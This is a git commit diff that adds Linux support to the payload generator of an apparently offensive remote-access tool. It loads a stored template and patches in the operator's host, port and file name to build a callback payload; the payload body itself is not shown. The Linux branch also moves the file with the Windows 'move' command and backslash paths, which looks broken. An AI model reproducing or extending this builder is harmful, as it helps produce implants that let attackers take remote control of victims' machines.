13a2e415f1bf1ba1bd32765a5b6f9bf5e884a622
Trident Apollo <68052236+TriDEntApollO@users.noreply.github.com>
2022-12-03 14:29:06 +0530

    Added linux payload generation

--- sources/functions/generate.py
+++ sources/functions/generate.py
@@ -44,10 +44,28 @@ def generate(data=''):
                     line = line.replace(l3, f"call = os.path.join(os.getcwd(), '{name}')")
                 sys.stdout.write(line)
             subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
-            print(f"Payload generated and saved as '{path}'")
+            print(f"Windows Payload generated and saved as '{path}'")
         elif plt == 'linux':
             print("\nGenerating Linux payload...\n")
-            print("Coming Soon...")
+            with open(r'sources/templates/linux.bin', 'rb') as win:
+                data = load(win)
+                win.close()
+            with open(r'sources/templates/linux.py', 'w') as file:
+                file.write(data)
+                file.close()
+            for line in fileinput.input(r'sources/templates/linux.py', inplace=True):
+                l1 = "host = ip"
+                l2 = "port = prt"
+                l3 = "call = os.path.join(os.getcwd(), 'linux.py')"
+                if l1 in line:
+                    line = line.replace(l1, f"host = '{host}'")
+                if l2 in line:
+                    line = line.replace(l2, f"port = {port}")
+                if l3 in line:
+                    line = line.replace(l3, f"call = os.path.join(os.getcwd(), '{name}')")
+                sys.stdout.write(line)
+            subprocess.run(f'move sources\\templates\\linux.py "{path}"', capture_output=True, shell=True)
+            print(f"Linux Payload generated and saved as '{path}'")
         else:
             print('\nInvalid platform!')
             print("Enter 'generate -h' to view full usage")
